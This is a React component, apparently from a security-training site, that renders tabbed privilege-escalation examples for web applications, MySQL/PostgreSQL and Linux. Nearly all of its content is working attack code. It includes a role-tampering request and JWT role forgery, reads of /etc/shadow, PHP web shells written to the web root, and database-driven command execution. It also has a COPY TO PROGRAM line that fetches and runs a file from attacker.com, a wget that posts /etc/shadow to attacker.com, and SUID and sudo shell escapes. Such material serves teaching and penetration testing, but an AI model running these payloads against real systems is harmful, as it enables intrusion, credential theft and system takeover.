
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Crown, Terminal, Lock, Settings } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const PrivilegeEscalation: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Crown className="h-6 w-6" />
          Privilege Escalation
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs defaultValue="web-app" className="w-full">
          <TabsList className="grid grid-cols-3 w-full">
            <TabsTrigger value="web-app">Web Application</TabsTrigger>
            <TabsTrigger value="database">Database</TabsTrigger>
            <TabsTrigger value="system">System Level</TabsTrigger>
          </TabsList>

          <TabsContent value="web-app" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Web Application Privilege Escalation</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Parameter Tampering</h4>
              <CodeExample
                language="javascript"
                title="Role Parameter Manipulation"
                code={`// Vulnerable implementation
app.post('/updateProfile', (req, res) => {
    const { name, email, role } = req.body;
    // Dangerous: Allowing role parameter from client
    if (role) {
        updateUserRole(req.user.id, role);
    }
    updateUserProfile(req.user.id, { name, email });
});

// Attack payload
fetch('/updateProfile', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        name: 'John Doe',
        email: 'john@example.com',
        role: 'admin' // Privilege escalation attempt
    })
});`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">JWT Token Manipulation</h4>
              <CodeExample
                language="javascript"
                title="JWT Role Escalation"
                code={`// Original JWT payload
{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "user",
  "iat": 1516239022
}

// Modified payload for privilege escalation
{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "admin", // Changed from "user" to "admin"
  "iat": 1516239022
}

// Attack techniques:
// 1. Algorithm confusion (RS256 to HS256)
// 2. None algorithm
// 3. Weak secret brute force
// 4. Key confusion attacks`}
              />
            </div>
          </TabsContent>

          <TabsContent value="database" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Database Privilege Escalation</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">SQL Injection to DBA</h4>
              <CodeExample
                language="sql"
                title="MySQL Privilege Escalation"
                code={`-- Check current privileges
SELECT user(), current_user(), @@hostname;
SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%current_user%';

-- Escalate to FILE privileges
GRANT FILE ON *.* TO 'web_user'@'%';

-- Read system files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');

-- Write web shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- UDF (User Defined Function) privilege escalation
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('whoami');`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">PostgreSQL Privilege Escalation</h4>
              <CodeExample
                language="sql"
                title="PostgreSQL Command Execution"
                code={`-- Check current user and privileges
SELECT current_user, session_user;
SELECT * FROM pg_user WHERE usename = current_user;

-- Create and execute functions
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');

-- Copy command for file operations
COPY (SELECT '') TO PROGRAM 'wget http://attacker.com/shell.php -O /tmp/shell.php';
COPY (SELECT '') TO PROGRAM 'chmod +x /tmp/shell.php && /tmp/shell.php';

-- Large object for file read/write
SELECT lo_create(12345);
SELECT lo_put(12345, 0, '<?php system($_GET["cmd"]); ?>');
SELECT lo_export(12345, '/var/www/html/shell.php');`}
              />
            </div>
          </TabsContent>

          <TabsContent value="system" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">System Level Privilege Escalation</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">SUID/SGID Exploitation</h4>
              <CodeExample
                language="bash"
                title="SUID Binary Exploitation"
                code={`# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Common SUID escalation vectors
# If /usr/bin/find has SUID bit
find /etc/passwd -exec /bin/bash -p \;

# If /usr/bin/vim has SUID bit
vim -c ':!/bin/bash'

# If /usr/bin/less has SUID bit
less /etc/passwd
!/bin/bash

# If /usr/bin/wget has SUID bit
wget --post-file=/etc/shadow http://attacker.com/`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Sudo Exploitation</h4>
              <CodeExample
                language="bash"
                title="Sudo Privilege Escalation"
                code={`# Check sudo permissions
sudo -l

# Common sudo escalation techniques
# If user can run /usr/bin/vi as root
sudo vi
:!/bin/bash

# If user can run /usr/bin/python as root
sudo python -c 'import os; os.system("/bin/bash")'

# If user can run /usr/bin/perl as root
sudo perl -e 'exec "/bin/bash";'

# If user can run /usr/bin/ruby as root
sudo ruby -e 'exec "/bin/bash"'

# GTFOBins exploitation
# Check https://gtfobins.github.io/ for specific binaries`}
              />
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default PrivilegeEscalation;
